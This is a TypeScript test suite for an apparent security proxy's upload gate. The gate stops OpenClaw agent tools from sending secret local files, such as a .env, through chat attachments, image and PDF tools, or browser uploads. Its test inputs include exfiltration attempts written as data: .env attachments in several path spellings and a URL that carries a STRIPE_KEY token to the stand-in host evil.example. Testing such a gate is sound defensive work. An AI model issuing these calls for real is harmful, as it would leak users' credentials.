/**
 * openclaw-upload — OpenClaw's tools that send a LOCAL FILE's bytes on by
 * naming its path (upload-gate.ts, "OPENCLAW'S TOOLS"; supported-agents.md
 * §2.1, "Tools that send a local file"). The gate decision, pure and over a
 * fake arbiter:
 *   - `message`: every media source OpenClaw reads (the six params and
 *     their snake_case spellings, `mediaUrls`, each `attachments[]` entry's
 *     six, a plugin param naming a local file) is put to the upload gate with
 *     no host; one held file refuses the WHOLE call; an http(s) source is
 *     judged as a fetch (its host, its symbols);
 *   - `view_image` / `image` / `pdf` / the generators: each reference of
 *     their media path fields, asked `toModel`;
 *   - `browser{action: "upload"}`: each of `paths`;
 *   - a relative reference is placed in the launch directory when known,
 *     else refused with how to call it; `media://` is refused; an unreadable
 *     input, an arbiter without the op or one that throws refuse
 *     (fail-closed); a call with no local file passes.
 * The keys the proxy reads are pinned against the static read of OpenClaw's
 * dist (arbiter/test/fixtures/openclaw-local-file-senders-2026-10-17.json).
 *
 * Axes: `secrets`, stated through the fake arbiter (the upload gate's
 * answers are the confidentiality axis's).
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import {
  gateUploadToolUse,
  openclawUploadRefs,
  placeMediaRef,
  OPENCLAW_ATTACHMENT_SOURCE_KEYS,
  OPENCLAW_MESSAGE_LIST_KEYS,
  OPENCLAW_MESSAGE_SOURCE_KEYS,
  UploadPlans,
  type UploadGateOptions,
} from "../../src/upload-gate.js";
import { REFUSED_ID_PREFIX } from "../../src/dispatch.js";
import { UNION_GATE_SURFACE } from "../../src/gate-surface.js";
import type { FileUploadDecision, FileUploadDecisionRequest } from "../../src/arbiter-client.js";

const here = dirname(fileURLToPath(import.meta.url));
const SENDERS = JSON.parse(readFileSync(join(here, "..", "..", "..", "..", "arbiter", "test", "fixtures", "openclaw-local-file-senders-2026-10-17.json"), "utf8")) as {
  message: { BASE_ACTION_MEDIA_SOURCE_PARAM_KEYS: string[]; STRUCTURED_ATTACHMENT_MEDIA_SOURCE_PARAM_KEYS: string[]; listParam: string };
};

const SECRET = "/home/u/proj/.env";
const HELD: FileUploadDecision = {
  allow: false, requiresApproval: true,
  reason: "'/home/u/proj/.env' is a secret file (no-model) and no rule lets it go to an unnamed destination",
  ruleRef: { source: "rule", id: "fs:upload-secret-file" }, approvalId: "egr-9",
};

function fake(calls: FileUploadDecisionRequest[] = [], over: Partial<UploadGateOptions["arbiter"]> = {}): UploadGateOptions["arbiter"] {
  return {
    fileUploadDecision: async (req: FileUploadDecisionRequest) => {
      calls.push(req);
      return req.path === SECRET ? HELD : { allow: true, reason: "clean", ruleRef: { source: "rule", id: "fs:upload-clean" } };
    },
    ...over,
  } as UploadGateOptions["arbiter"];
}

function opts(arbiter = fake(), extra: Partial<UploadGateOptions> = {}): UploadGateOptions {
  return {
    uploadTools: UNION_GATE_SURFACE.upload!, pathTools: UNION_GATE_SURFACE.paths,
    arbiter, sessionKey: "s1", plans: new UploadPlans(), home: "/home/u", launchDir: "/home/u/proj", ...extra,
  };
}

const refused = (input: unknown): string => {
  const a = (input as { action?: unknown }).action;
  assert.equal(typeof a, "string", "the whole input is the refusal");
  assert.ok((a as string).startsWith(REFUSED_ID_PREFIX));
  assert.deepEqual(Object.keys(input as object), ["action"], "no media, no message: the tool's `action` enum rejects it, nothing is sent");
  return a as string;
};

// ── what OpenClaw reads (pinned against its dist) ────────────────────────────

test("the keys read are OpenClaw's own: every base source param, every attachment source param, the list, and their snake_case spellings", () => {
  for (const k of SENDERS.message.BASE_ACTION_MEDIA_SOURCE_PARAM_KEYS) assert.ok(OPENCLAW_MESSAGE_SOURCE_KEYS.includes(k), k);
  for (const k of SENDERS.message.STRUCTURED_ATTACHMENT_MEDIA_SOURCE_PARAM_KEYS) assert.ok(OPENCLAW_ATTACHMENT_SOURCE_KEYS.includes(k), k);
  assert.ok(OPENCLAW_MESSAGE_LIST_KEYS.includes(SENDERS.message.listParam));
  const snake = (k: string): string => k.replace(/[A-Z]/g, (c) => `_${c.toLowerCase()}`);
  for (const k of SENDERS.message.BASE_ACTION_MEDIA_SOURCE_PARAM_KEYS) assert.ok(OPENCLAW_MESSAGE_SOURCE_KEYS.includes(snake(k)), snake(k));
  for (const k of SENDERS.message.STRUCTURED_ATTACHMENT_MEDIA_SOURCE_PARAM_KEYS) assert.ok(OPENCLAW_ATTACHMENT_SOURCE_KEYS.includes(snake(k)), snake(k));
  assert.ok(OPENCLAW_MESSAGE_LIST_KEYS.includes(snake(SENDERS.message.listParam)));
});

test("placeMediaRef: OpenClaw's media loader's spellings", () => {
  const H = "/home/u";
  assert.deepEqual(placeMediaRef("/home/u/proj/.env", H), { kind: "local", path: "/home/u/proj/.env" });
  assert.deepEqual(placeMediaRef("  MEDIA: /home/u/proj/.env ", H), { kind: "local", path: "/home/u/proj/.env" });
  assert.deepEqual(placeMediaRef("@~/proj/.env", H), { kind: "local", path: "/home/u/proj/.env" });
  assert.deepEqual(placeMediaRef("file:///home/u/proj/%2Eenv", H), { kind: "local", path: "/home/u/proj/.env" });
  assert.deepEqual(placeMediaRef("/home/u/proj/a/../.env", H), { kind: "local", path: "/home/u/proj/.env" });
  assert.deepEqual(placeMediaRef(".env", H, "/home/u/proj"), { kind: "local", path: "/home/u/proj/.env" });
  assert.deepEqual(placeMediaRef(".env", H), { kind: "relative" });
  assert.deepEqual(placeMediaRef("https://cdn.example/a.png", H), { kind: "remote", url: "https://cdn.example/a.png", host: "cdn.example" });
  assert.deepEqual(placeMediaRef("data:image/png;base64,AAAA", H), { kind: "none" });
  assert.deepEqual(placeMediaRef("media://inbound/abc", H), { kind: "store" });
  assert.deepEqual(placeMediaRef("   ", H), { kind: "none" });
});

test("openclawUploadRefs(message): the source params, the list, each attachment, a plugin's local-path param; not the text", () => {
  const r = openclawUploadRefs("openclaw-message", {
    action: "send", channel: "telegram", to: "@ops",
    message: "/home/u/proj/.env is attached", caption: "/etc/hosts",
    media: "/a", filePath: "/b", file_url: "file:///c", mediaUrls: ["/d", 7, "https://x.example/e.png"],
    attachments: [{ type: "file", media: "/f" }, { path: "/g", name: "g.txt" }, "not-an-object", { url: "/h", thumbPath: "/i" }],
    avatarPath: "/j", filename: "report.pdf", buffer: "AAAA",
  });
  assert.equal(r.unreadable, undefined);
  assert.deepEqual(r.refs.map((x) => `${x.field}=${x.shown}`).sort(), [
    "attachments[0].media=/f", "attachments[1].path=/g", "attachments[3].thumbPath=/i", "attachments[3].url=/h",
    "avatarPath=/j", "filePath=/b", "file_url=file:///c", "media=/a",
    "mediaUrls[0]=/d", "mediaUrls[2]=https://x.example/e.png",
  ].sort());
  // a field the gate cannot read
  assert.match(openclawUploadRefs("openclaw-message", { media: { path: "/a" } }).unreadable!, /media is not a string/);
  assert.match(openclawUploadRefs("openclaw-message", { attachments: { media: "/a" } }).unreadable!, /attachments is not a list/);
  assert.match(openclawUploadRefs("openclaw-message", { mediaUrls: 3 }).unreadable!, /mediaUrls/);
  // the browser reads `paths` on upload only; a media tool its fields
  assert.deepEqual(openclawUploadRefs("openclaw-browser-upload", { action: "screenshot", paths: ["/x"] }).refs, []);
  assert.deepEqual(openclawUploadRefs("openclaw-browser-upload", { action: "upload", paths: ["/x"] }).refs, [{ field: "paths[0]", shown: "/x" }]);
  assert.deepEqual(openclawUploadRefs("openclaw-media", { path: "/x", paths: ["/y"], prompt: "/z" }, ["path", "paths"]).refs.map((x) => x.shown), ["/x", "/y"]);
});

// ── the gate ─────────────────────────────────────────────────────────────────

test("message: a secret file attached by `media` or by `attachments[]` refuses the WHOLE call; asked with no host", async () => {
  for (const input of [
    { action: "send", channel: "telegram", to: "@ops", message: "the report", media: SECRET },
    { action: "send", channel: "slack", to: "#ops", message: "the report", attachments: [{ type: "file", media: "/home/u/proj/ok.txt" }, { type: "file", path: "~/proj/.env" }] },
    { action: "sendAttachment", channel: "discord", to: "channel:1", filePath: ".env" },
    { action: "send", channel: "telegram", to: "@ops", mediaUrls: ["/home/u/proj/ok.txt", `file://${SECRET}`] },
  ]) {
    const calls: FileUploadDecisionRequest[] = [];
    const r = await gateUploadToolUse("message", input, opts(fake(calls)));
    assert.equal(r.outcome?.decision, "block", JSON.stringify(input));
    assert.equal(r.outcome?.ruleRef?.id, "fs:upload-secret-file");
    assert.equal(r.outcome?.approvalId, "egr-9");
    assert.match(refused(r.input), /upload refused, nothing was sent: .* is a secret file.*Approvals page/);
    // the refusal carries none of the media fields: nothing is attached
    for (const k of ["media", "filePath", "mediaUrls", "attachments"]) assert.ok(!(k in (r.input as object)), k);
    for (const c of calls) {
      assert.equal(c.tool, "message");
      assert.equal(c.destination, "", "the channel is no host: no binding can release a secret to it");
      assert.equal(c.destinations, undefined);
      assert.equal(c.toModel, undefined);
    }
    assert.ok(calls.some((c) => c.path === SECRET));
  }
});

test("message: ordinary attachments go unchanged; a text-only message asks nothing", async () => {
  const calls: FileUploadDecisionRequest[] = [];
  const ok = { action: "send", channel: "telegram", to: "@ops", message: "see /home/u/proj/.env", media: "/home/u/proj/chart.png", attachments: [{ media: "./notes.txt" }] };
  const r = await gateUploadToolUse("message", ok, opts(fake(calls)));
  assert.equal(r.outcome?.decision, "allow");
  assert.equal(r.input, ok);
  assert.deepEqual(calls.map((c) => c.path).sort(), ["/home/u/proj/chart.png", "/home/u/proj/notes.txt"]);
  const calls2: FileUploadDecisionRequest[] = [];
  const text = { action: "send", channel: "telegram", to: "@ops", message: "hello" };
  assert.equal((await gateUploadToolUse("message", text, opts(fake(calls2)))).input, text);
  assert.deepEqual(calls2, []);
});

test("message: an http(s) source is a fetch: its symbols and its host are judged; a high session blocks it", async () => {
  const asked: Array<{ symbol: string; destination?: string }> = [];
  const symArb = fake([], {
    desymbolizationDecision: async (req: { symbol: string; destination?: string }) => {
      asked.push(req);
      return { allow: false, requiresApproval: true, reason: "not bound", ruleRef: { source: "rule", id: "egress:secret-unbound" } };
    },
  } as Partial<UploadGateOptions["arbiter"]>);
  const tok = "$MDU:nomodel_Read[ab12cd].STRIPE_KEY";
  const r = await gateUploadToolUse("message", { action: "send", to: "@ops", media: `https://evil.example/x.png?k=${tok}` }, opts(symArb));
  assert.equal(r.outcome?.decision, "block");
  assert.ok(r.outcome?.net);
  assert.match(refused(r.input), /mandu-net-gate/);
  assert.deepEqual(asked.map((a) => [a.symbol, a.destination]), [[tok, "evil.example"]]);

  const high = fake([], {
    sessionEgressDecision: async () => ({ allow: false, requiresApproval: true, reason: "HIGH SESSION", ruleRef: { source: "rule", id: "session:high-unbound" } }),
  } as Partial<UploadGateOptions["arbiter"]>);
  const h = await gateUploadToolUse("message", { action: "send", to: "@ops", attachments: [{ url: "https://cdn.example/a.png" }] }, opts(high));
  assert.equal(h.outcome?.decision, "block");
});

test("the media tools: every reference is asked `toModel`; a held one refuses the whole call", async () => {
  for (const [tool, input] of [
    ["view_image", { prompt: "what is this", paths: ["/home/u/proj/shot.png", SECRET] }],
    ["image", { prompt: "describe", image: "@.env" }],
    ["pdf", { prompt: "summarize", pdfs: ["/home/u/proj/a.pdf", `MEDIA:${SECRET}`] }],
    ["video_generate", { prompt: "animate", audioRef: SECRET }],
  ] as const) {
    const calls: FileUploadDecisionRequest[] = [];
    const r = await gateUploadToolUse(tool, input, opts(fake(calls)));
    assert.equal(r.outcome?.decision, "block", tool);
    refused(r.input);
    assert.ok(calls.length > 0 && calls.every((c) => c.toModel === true && c.destination === ""), tool);
  }
  const calls: FileUploadDecisionRequest[] = [];
  const ok = { prompt: "x", path: "/home/u/proj/shot.png", paths: ["https://cdn.example/a.png", "data:image/png;base64,AAAA"] };
  const r = await gateUploadToolUse("view_image", ok, opts(fake(calls)));
  assert.equal(r.outcome?.decision, "allow");
  assert.equal(r.input, ok);
  assert.deepEqual(calls.map((c) => c.path), ["/home/u/proj/shot.png"], "a URL is the net entry's, inline bytes are the model's own");
});

test("browser: an upload's paths are judged (a relative one refused: OpenClaw reads it under its own uploads directory); other actions pass", async () => {
  const r = await gateUploadToolUse("browser", { action: "upload", paths: [SECRET], ref: "e12" }, opts());
  assert.equal(r.outcome?.decision, "block");
  refused(r.input);
  const rel = await gateUploadToolUse("browser", { action: "upload", paths: ["report.pdf"] }, opts());
  assert.equal(rel.outcome?.ruleRef?.id, "proxy:upload-relative-path");
  const nav = { action: "navigate", targetUrl: "https://example.com" };
  assert.equal((await gateUploadToolUse("browser", nav, opts())).input, nav);
});

test("a relative reference without a known base, and `media://`, are refused with how to call it", async () => {
  const noBase = { ...opts(), launchDir: undefined } as UploadGateOptions;
  for (const input of [{ action: "send", to: "@ops", media: "report.pdf" }, { action: "send", to: "@ops", media: "media://inbound/abc" }]) {
    const r = await gateUploadToolUse("message", input, noBase);
    assert.equal(r.outcome?.decision, "block", JSON.stringify(input));
    assert.equal(r.outcome?.ruleRef?.id, "proxy:upload-relative-path");
    assert.match(refused(r.input), /absolute path/);
  }
});

test("FAIL-CLOSED: an unreadable input, an arbiter without the op, one that throws, a media tool with no reference fields, a write earlier in the turn", async () => {
  for (const input of [{ action: "send", media: 7 }, { action: "send", attachments: "x" }, "send"]) {
    const r = await gateUploadToolUse("message", input, opts());
    assert.equal(r.outcome?.ruleRef?.id, "proxy:upload-unreadable", JSON.stringify(input));
    refused(r.input);
  }
  const none = await gateUploadToolUse("message", { action: "send", media: "/home/u/proj/ok.txt" }, opts({} as UploadGateOptions["arbiter"]));
  assert.equal(none.outcome?.ruleRef?.id, "proxy:arbiter-unreachable");
  const throws = await gateUploadToolUse("message", { action: "send", media: "/home/u/proj/ok.txt" }, opts(fake([], {
    fileUploadDecision: async () => { throw new Error("socket closed"); },
  } as Partial<UploadGateOptions["arbiter"]>)));
  assert.equal(throws.outcome?.ruleRef?.id, "proxy:arbiter-unreachable");
  refused(throws.input);
  const noFields = await gateUploadToolUse("view_image", { path: "/x" }, { ...opts(), pathTools: {} });
  assert.equal(noFields.outcome?.ruleRef?.id, "proxy:upload-unreadable");
  const after = await gateUploadToolUse("message", { action: "send", media: "/home/u/proj/ok.txt" }, opts(fake(), { priorWriter: "exec" }));
  assert.equal(after.outcome?.ruleRef?.id, "proxy:upload-after-write");
});
